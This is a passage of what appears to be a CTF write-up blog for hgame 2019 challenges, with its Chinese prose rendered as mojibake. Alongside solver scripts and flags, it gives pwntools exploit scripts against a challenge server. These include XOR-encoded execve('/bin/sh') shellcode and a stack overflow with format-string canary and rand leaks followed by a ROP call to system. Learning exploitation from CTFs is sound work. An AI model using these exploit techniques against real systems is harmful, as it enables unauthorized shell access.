<p>æ¯ä¸€æ®µä»£ç ç›¸å½“äºå®ç°äº†ä¸€ä¸ªä¸Šé¢çš„æ–¹ç¨‹ï¼Œå°† 9 æ®µä»£ç å…¨éƒ¨åˆ†æå‡ºæ¥ä¹‹åå³å¯å¾—åˆ° flagã€‚  </p>
<p>flag: hgame{bR4!NfUcK}</p>
<h2 id="HelloRe"><a href="#HelloRe" class="headerlink" title="HelloRe"></a>HelloRe</h2><p>IDA æ‰“å¼€æ‰¾åˆ° flagã€‚</p>
<p>flag: hgame{Welc0m3_t0_R3_World!}</p>
<h2 id="ã‚ã‹ã‚Šã¾ã™"><a href="#ã‚ã‹ã‚Šã¾ã™" class="headerlink" title="ã‚ã‹ã‚Šã¾ã™"></a>ã‚ã‹ã‚Šã¾ã™</h2><p>è¿™é“é¢˜ç¨å¾®æœ‰ç‚¹è´¹åŠ²ï¼Œå…³é”®ä»£ç å¦‚ä¸‹<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-2.png"
                      alt="image"
                > </p>
<p>å…³é”®å‡½æ•°æ˜¯ä¸­é—´çš„ sub_40078E å’Œ sub_400892ã€‚<br>æœ¬ç¨‹åºçš„åŸºæœ¬é€»è¾‘æ˜¯å…ˆå°†è¾“å…¥çš„ flag è¿›è¡Œä¸¤æ¬¡ä¸åŒçš„ç¼–ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for ( i = 0; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk1[i] = (flag[i] &gt;&gt; 4);</span><br><span class="line">    chunk2[i] = flag[i] &amp; 0xF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>åˆ†åˆ«ä¿å­˜åœ¨ä¸¤ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œæ¥ç€è¿›å…¥å…³é”®å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°å®ç°çš„æ˜¯ä¸¤ä¸ªçŸ©é˜µç›¸ä¹˜ï¼Œç»“æœä¿å­˜åœ¨ v8 ä¸­ï¼Œç¬¬äºŒä¸ªå‡½æ•°å®ç°çš„æ˜¯çŸ©é˜µç›¸åŠ ï¼Œç”±äºä¸¤ä¸ªçŸ©é˜µéƒ½æ˜¯ 6 é˜¶æ–¹é˜µï¼Œæ‰€ä»¥è¿ç®—ä¹Ÿç›¸å¯¹ç®€å•ï¼Œæ ¹æ®ä¸‹é¢çš„æ–¹ç¨‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enc_flag * token = dword_602120</span><br><span class="line"></span><br><span class="line">enc_flag + token = dword_6021c0</span><br></pre></td></tr></table></figure></div>
<p>ç°åœ¨ token å’Œæœ€ç»ˆçš„è¿ç®—ç»“æœéƒ½å·²çŸ¥ï¼Œé‚£ä¹ˆ flag çŸ©é˜µæ˜¯å¯ä»¥æ±‚å‡ºçš„ï¼Œæ±‚çŸ©é˜µçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæˆ‘é‡‡å– Z3 è¿›è¡Œçº¦æŸæ±‚è§£</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">target1 = [122, 207, 140, 149, 142, 168, </span><br><span class="line">           95,  201, 122, 145, 136, 167, </span><br><span class="line">           112, 192, 127, 137, 134, 147, </span><br><span class="line">           95, 207, 110, 134, 133, 173, </span><br><span class="line">           136, 212, 160, 162, 152, 179, </span><br><span class="line">           121, 193, 126, 126, 119, 147]</span><br><span class="line"></span><br><span class="line">token = [8, 1, 7, 1, 1, 0, </span><br><span class="line">         4, 8, 1, 2, 3, 9, </span><br><span class="line">         3, 8, 6, 6, 4, 8, </span><br><span class="line">         3, 5, 7, 8, 8, 7, </span><br><span class="line">         0, 9, 0, 2, 3, 4, </span><br><span class="line">         2, 3, 2, 5, 4, 0]</span><br><span class="line"></span><br><span class="line">target2 = [16, 8, 8, 14, 6, 11, </span><br><span class="line">           5, 23, 5, 10, 12, 23, </span><br><span class="line">		   14, 23, 19, 7, 8, 10, </span><br><span class="line">		   4, 13, 22, 17, 11, 22, </span><br><span class="line">		   6, 14, 2, 11, 18, 9, </span><br><span class="line">		   5, 8, 8, 10, 16, 13]</span><br><span class="line"></span><br><span class="line">chunk2 = [8, 7, 1, 13, 5, 11, 1, 15, 4, 8, 9, 14, 11, 15, 13, 1, 4, 2, 1, 8, 15, 9, 3, 15, 6, 5, 2, 9, 15, 5, 3, 5, 6, 5, 12, 13]</span><br><span class="line"></span><br><span class="line">a = BitVec(&#x27;a&#x27;, 8)</span><br><span class="line">b = BitVec(&#x27;b&#x27;, 8)</span><br><span class="line">c = BitVec(&#x27;c&#x27;, 8)</span><br><span class="line">d = BitVec(&#x27;d&#x27;, 8)</span><br><span class="line">e = BitVec(&#x27;e&#x27;, 8)</span><br><span class="line">f = BitVec(&#x27;f&#x27;, 8)</span><br><span class="line"></span><br><span class="line">j = 0</span><br><span class="line">k = 0</span><br><span class="line">p = 0</span><br><span class="line">for q in range(6):</span><br><span class="line">    solve((a &gt;&gt; 4) * token[k] + (b &gt;&gt; 4) * token[k + 6] + (c &gt;&gt; 4) * token[k + 12] + (d &gt;&gt; 4) * token[k + 18] + (e &gt;&gt; 4) * token[k + 24] + (f &gt;&gt; 4) * token[k + 30] == target1[j],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 1] + (b &gt;&gt; 4) * token[k + 6 + 1] + (c &gt;&gt; 4) * token[k + 12 + 1] + (d &gt;&gt; 4) * token[k + 18 + 1] + (e &gt;&gt; 4) * token[k + 24 + 1] + (f &gt;&gt; 4) * token[k + 30 + 1] == target1[j + 1],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 2] + (b &gt;&gt; 4) * token[k + 6 + 2] + (c &gt;&gt; 4) * token[k + 12 + 2] + (d &gt;&gt; 4) * token[k + 18 + 2] + (e &gt;&gt; 4) * token[k + 24 + 2] + (f &gt;&gt; 4) * token[k + 30 + 2] == target1[j + 2],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 3] + (b &gt;&gt; 4) * token[k + 6 + 3] + (c &gt;&gt; 4) * token[k + 12 + 3] + (d &gt;&gt; 4) * token[k + 18 + 3] + (e &gt;&gt; 4) * token[k + 24 + 3] + (f &gt;&gt; 4) * token[k + 30 + 3] == target1[j + 3],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 4] + (b &gt;&gt; 4) * token[k + 6 + 4] + (c &gt;&gt; 4) * token[k + 12 + 4] + (d &gt;&gt; 4) * token[k + 18 + 4] + (e &gt;&gt; 4) * token[k + 24 + 4] + (f &gt;&gt; 4) * token[k + 30 + 4] == target1[j + 4],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 5] + (b &gt;&gt; 4) * token[k + 6 + 5] + (c &gt;&gt; 4) * token[k + 12 + 5] + (d &gt;&gt; 4) * token[k + 18 + 5] + (e &gt;&gt; 4) * token[k + 24 + 5] + (f &gt;&gt; 4) * token[k + 30 + 5] == target1[j + 5],</span><br><span class="line">a &amp; 0xf == chunk2[p], b &amp; 0xf == chunk2[p + 1], c &amp; 0xf == chunk2[p + 2], d &amp; 0xf == chunk2[p + 3], e &amp; 0xf == chunk2[p + 4], f &amp; 0xf == chunk2[p + 5])</span><br><span class="line">    j += 6</span><br><span class="line">    p += 6</span><br><span class="line"></span><br><span class="line">#[f = 123, b = 103, a = 104, c = 97, d = 109, e = 101]</span><br><span class="line">#[f = 110, b = 95, a = 49, c = 116, d = 104, e = 105]</span><br><span class="line">#[f = 114, b = 95, a = 107, c = 77, d = 97, e = 116]</span><br><span class="line">#[f = 95, b = 120, a = 49, c = 95, d = 105, e = 115]</span><br><span class="line">#[f = 117, b = 101, a = 118, c = 114, d = 121, e = 95]</span><br><span class="line">#[f = 125, b = 101, a = 115, c = 102, d = 53, e = 108]</span><br><span class="line"></span><br><span class="line">#hgame&#123;1_think_Matr1x_is_very_usef5l&#125;</span><br><span class="line"></span><br><span class="line">flag = [104,103,97,109,101,123,49,95,116,104,105,110,107,95,77,97,116,114,49,120,95,105,115,95,118,101,114,121,95,117,115,101,102,53,108,125]</span><br><span class="line"></span><br><span class="line">qwer = &quot;&quot;</span><br><span class="line">for q in flag:</span><br><span class="line">    qwer += chr(q)</span><br><span class="line">print(qwer)</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{1_think_Matr1x_is_very_usef5l}</p>
<h2 id="r-amp-xor"><a href="#r-amp-xor" class="headerlink" title="r &amp; xor"></a>r &amp; xor</h2><p>ç®€å•çš„å¼‚æˆ–åŠ å¯†ï¼Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œç”±äº IDA çš„è§£æé—®é¢˜ï¼Œæœ‰ä¸€éƒ¨åˆ† token ä¸èƒ½æ˜¾ç¤ºå‡ºæ¥ï¼Œéœ€è¦åŠ¨æ€è°ƒè¯•å¾—åˆ°ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &quot;hgame&#123;Y0u_mayb3_need_th1s_0ne!!!!!&#125;&quot;</span><br><span class="line">d = [0,0,0,0,0,0,1,0,7,0,92,18,38,11,93,43,11,23,0,23,43,69,6,86,44,54,67,0,66,85,126,72,85,30,0,0]</span><br><span class="line">t = &quot;&quot;</span><br><span class="line">for i in range(35):</span><br><span class="line">    t += chr(ord(s[i]) ^ d[i])</span><br><span class="line">print(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{X0r_1s_interest1ng_isnâ€™t_it?}</p>
<h2 id="Proçš„Pythonæ•™å®¤-ä¸€"><a href="#Proçš„Pythonæ•™å®¤-ä¸€" class="headerlink" title="Proçš„Pythonæ•™å®¤(ä¸€)"></a>Proçš„Pythonæ•™å®¤(ä¸€)</h2><p>æŠŠä»£ç ä¸­çš„ enc2 BASE64 è§£å¯†å³å¯ã€‚  </p>
<p>flag: hgame{Here_1s_3asy_Pyth0n}</p>
<h2 id="babysc"><a href="#babysc" class="headerlink" title="babysc"></a>babysc</h2><p>ä¸»å‡½æ•°ä»£ç ä¸èƒ½æ­£å¸¸ F5ï¼Œæç¤ºæœ‰ä¸€å¤„ call åˆ†æå¤±è´¥ï¼Œå°†å®ƒ nop æ‰ä¹‹åå† F5 ï¼Œå¾—åˆ°å¦‚ä¸‹ä¼ªä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[92]; // [rsp+0h] [rbp-60h]</span><br><span class="line">  int i; // [rsp+5Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  signal(14, (__sighandler_t)handle);</span><br><span class="line">  alarm(0xAu);</span><br><span class="line">  read(0, buf, 80uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 79; ++i )</span><br><span class="line">    buf[i] ^= i + 1;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¤§æ¦‚çš„æ„æ€å°±æ˜¯æŠŠè¾“å…¥è¿›è¡Œå¼‚æˆ–åŠ å¯†ï¼Œæœ€åçš„ call åº”è¯¥æ˜¯è·³è½¬åˆ°ç”¨æˆ·çš„è¾“å…¥ç»§ç»­æ‰§è¡Œã€‚<br>å…ˆæŠŠè¾“å…¥çš„ shellcode å¼‚æˆ–å°±è¡Œã€‚  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">binary = &quot;./babysc&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10000</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line">new_shellcode = &quot;&quot;</span><br><span class="line">for i in range(len(shellcode)):</span><br><span class="line">    new_shellcode += chr(ord(shellcode[i]) ^ (i + 1))</span><br><span class="line">print(new_shellcode)</span><br><span class="line">p.sendline(new_shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{Baby_Baby_S0_E4ay!}</p>
<h2 id="aaaaaaaaaa"><a href="#aaaaaaaaaa" class="headerlink" title="aaaaaaaaaa"></a>aaaaaaaaaa</h2><p>è¿ä¸Šå»è¾“å…¥ 100 ä¸ª a å°±å¯ä»¥äº†ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./babysc&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  9999</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;a&quot; * 100)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>flag: hgame{Aa4_4aA_4a4aAAA}</p>
<h2 id="è–¯ç‰‡æ‹¯æ•‘ä¸–ç•Œ1"><a href="#è–¯ç‰‡æ‹¯æ•‘ä¸–ç•Œ1" class="headerlink" title="è–¯ç‰‡æ‹¯æ•‘ä¸–ç•Œ1"></a>è–¯ç‰‡æ‹¯æ•‘ä¸–ç•Œ1</h2><p>é™¤äº†é‚£äº›èŠ±é‡Œèƒ¡å“¨çš„ä¸œè¥¿ä¹‹å¤–ï¼Œé€»è¾‘å°±æ˜¯å…ˆæŠŠ flag è¯»å–åˆ°ä¸€ä¸ªå…¨å±€å˜é‡é‡Œé¢ï¼Œç„¶åè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œè¦æ±‚æˆ‘ä»¬è¾“å…¥ flagï¼Œå¹¶ä¸”ä½¿ç”¨ strncmp å‡½æ•°å’Œ flag æ¯”è¾ƒã€‚<br>ç”±äºæ¯”è¾ƒçš„å­—èŠ‚æ•°æ˜¯ç”± strlen ç¡®å®šçš„ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶è¾“å…¥é•¿åº¦æ¥çˆ†ç ´ flagã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./CSTW&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10001</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line"># context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Ch1p Save The World--Chapter 1\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;...\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;é­”ç‹çš„å°å°åœ¨2000å¹´åçš„ä»Šå¤©ç»ˆäºè¢«è§£å¼€\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;äººç±»åˆåˆ°äº†ç”Ÿæ­»å­˜äº¡çš„æœ€åå…³å¤´\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;â€”â€”Ch1p\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">flag = &quot;hgame&#123;Ch1p_1s_&quot;</span><br><span class="line">token = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#125;&quot;</span><br><span class="line">for i in range(len(token)):</span><br><span class="line">    flag += token[i]</span><br><span class="line">    print(&quot;Trying: %s&quot; % flag)</span><br><span class="line">    p.recvuntil(&quot;ä¸ºæ­¤ï¼Œå¤§ç¥­å¸å¿…é¡»å¿µå‡ºå½“å¹´çº¦å®šçš„é‚£ä¸²å’’è¯­â€”â€”\n&quot;)</span><br><span class="line">    p.send(flag + &quot;\x00&quot;)</span><br><span class="line">    result = p.recv(6)</span><br><span class="line">    if &quot;......&quot; in result:</span><br><span class="line">        flag = &quot;hgame&#123;Ch1p_1s_&quot;</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;FOUND : %s&quot; % flag)</span><br><span class="line">        break</span><br><span class="line"># p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{Ch1p_1s_Awakking!}</p>
<h2 id="Steins-Gate"><a href="#Steins-Gate" class="headerlink" title="Steins;Gate"></a>Steins;Gate</h2><p>è¿™é“é¢˜è€ƒå¯Ÿçš„ä¸œè¥¿æ¯”è¾ƒå¤šï¼Œç±»ä¼¼é—¯å…³ä¸€æ ·åˆ†æˆå››å…³ï¼Œç¬¬ä¸€å…³ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_4008F6()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-40h]</span><br><span class="line">  int v2; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;To seek the truth of the world.&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x80uLL);</span><br><span class="line">  if ( v2 != 9011 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¦æ±‚ v2 &#x3D;&#x3D; 9011ï¼Œé€šè¿‡ä¸Šé¢çš„ read æ ˆæº¢å‡ºæ§åˆ¶ v2ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥æ§åˆ¶è¿”å›åœ°å€ï¼Œå› ä¸ºç¨‹åºå¼€å¯äº† canaryã€‚<br>ç¬¬äºŒå…³ä»£ç ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_400958()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST0C_4</span><br><span class="line">  char buf; // [rsp+10h] [rbp-40h]</span><br><span class="line">  char v3; // [rsp+14h] [rbp-3Ch]</span><br><span class="line">  int v4; // [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  v0 = v4;</span><br><span class="line">  puts(&quot;Repeater is nature of man.&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  printf(&amp;buf, &amp;buf);</span><br><span class="line">  puts(&quot;You found it?&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x34uLL);</span><br><span class="line">  if ( v4 - 4660 != v0 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å‡º rand å‡ºçš„æ•°å€¼ï¼Œç„¶åæ ˆæº¢å‡ºæ§åˆ¶ v4 æ»¡è¶³è¦æ±‚ã€‚<br>ç¬¬ä¸‰å…³ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_400A00()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-24h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-20h]</span><br><span class="line">  char v3; // [rsp+15h] [rbp-1Bh]</span><br><span class="line">  unsigned __int64 v4; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Payment of past debts.&quot;);</span><br><span class="line">  read(0, &amp;buf, 5uLL);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  printf(&amp;buf, &amp;buf);</span><br><span class="line">  if ( v1 != 26214 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œé€šè¿‡åŠ¨æ€è°ƒè¯•å‘ç°ï¼Œv1 çš„å€¼æ­£å¥½åœ¨ä¸Šä¸€å…³ä¸­ buf çš„èŒƒå›´å†…ï¼Œæ‰€ä»¥åœ¨ä¸Šä¸€å…³å°±æ„é€ å¥½ payload æ»¡è¶³è¿™é‡Œçš„æ¡ä»¶ï¼Œä¹‹ååˆ©ç”¨ 5 å­—èŠ‚çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ² canaryã€‚<br>æœ€åä¸€å…³å’Œç¬¬ä¸€å…³ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯å·²ç»æ‹¿åˆ°äº† canaryï¼Œæ„é€ æ»¡è¶³æ¡ä»¶çš„ payload ç„¶åæ ˆæº¢å‡ºå³å¯ã€‚<br>ç¨‹åºä¸­æœ‰ system å‡½æ•°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_400A76(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  return system(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>åªéœ€è¦æ‰¾ä¸€ä¸ª pop rdi, ret çš„ gadget</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./SteinsGate&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10002</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;What&#x27;s your ID:&quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.recvuntil(&quot;To seek the truth of the world.\n&quot;)</span><br><span class="line">payload1 = &quot;a&quot; * 0x30 + p64(0x2333)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(&quot;Repeater is nature of man.\n&quot;)</span><br><span class="line">payload2 = &quot;%7$p&quot;</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(payload2)</span><br><span class="line">rand = int(p.recv(17),16) &gt;&gt; 28</span><br><span class="line">log.info(&quot;Rand : %x&quot; % rand)</span><br><span class="line">p.recvuntil(&quot;You found it?\n&quot;)</span><br><span class="line">payload3 = &quot;aaaaaaaabbbbbbbbccccccccddddff\x00\x00eeeeeeeeffffffff&quot; + p32(rand + 0x1234)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(&quot;Payment of past debts.\n&quot;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(&quot;%11$p&quot;)</span><br><span class="line">canary = int(p.recv(18),16)</span><br><span class="line">payload4 = &quot;a&quot; * 0x30 + p64(0x2333) + p64(canary) + &quot;b&quot; * 8 + p64(0x0000000000400c73) + p64(0x602040) + p64(0x400a76)</span><br><span class="line">p.recvuntil(&quot;To seek the truth of the world.\n&quot;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{El_PsY_C0NgrOO}</p>
<h2 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h2><p>ç®€å•çš„ LSB éšå†™ï¼Œç”¨ stegsolve æ‰“å¼€å°±å¯ä»¥çœ‹åˆ° flagã€‚</p>
<p>flag: hgame{LSB_is_easy_for_u}</p>
<h2 id="æ‰“å­—æœº"><a href="#æ‰“å­—æœº" class="headerlink" title="æ‰“å­—æœº"></a>æ‰“å­—æœº</h2><p>ç»™å‡ºäº†ä¸¤å¼ å›¾ç‰‡<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-3.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-4.png"
                      alt="image"
                ></p>
<p>ç¬¬ä¸€å¼ çœ‹ä¸Šå»åƒæŸç§æ‰“å­—æœºï¼Œç„¶åæ‰“å‡ºäº† flagï¼Œè°·æ­Œè¯†å›¾ä¹‹åå‘ç°è¿™ä¸ªæ‰“å­—æœºæ˜¯æŸéƒ¨åŠ¨ç”»ç‰‡é‡Œçš„ï¼Ÿ<br>åœ¨çŸ¥ä¹ä¸Šæ‰¾åˆ°ä¸€ç¯‡<a class="link"   href="https://www.zhihu.com/question/266139542/answer/303595744" >æ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-5.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-6.png"
                      alt="image"
                ></p>
<p>é€šè¿‡è¿™ä¸¤å¼ å›¾ç‰‡æ…¢æ…¢çœ‹(çŒœ)å°±èƒ½çœ‹(çŒœ)å‡º flagã€‚(æ‰“å­—æœºä¸Šå°çš„æ˜¯å¤§å†™ï¼Œè€Œ flag ä¸­æœ‰å°å†™å­—æ¯â€¦)</p>
<p>flag: hgame{My_vi0let_tyPewRiter}</p>
<h2 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h2><p>å‹ç¼©åŒ…é¢˜ç›®ï¼Œä¸èƒ½æ­£å¸¸è§£å‹ï¼Œç”¨ 010 editor æ‰“å¼€çœ‹åˆ°å‹ç¼©åŒ…å¤´éƒ¨çš„ PK å˜æˆäº† OKï¼Œæ”¹å›æ¥ä¹‹åå†è§£å‹(å¯†ç åœ¨ winrar å³é¢çš„æ³¨é‡Šæ é‡Œé¢ S0mETh1ng_U5efuL)ï¼Œå³å¯å¾—åˆ° flagã€‚</p>
<p>flag: hgame{Cra2y_D1aM0nd}</p>
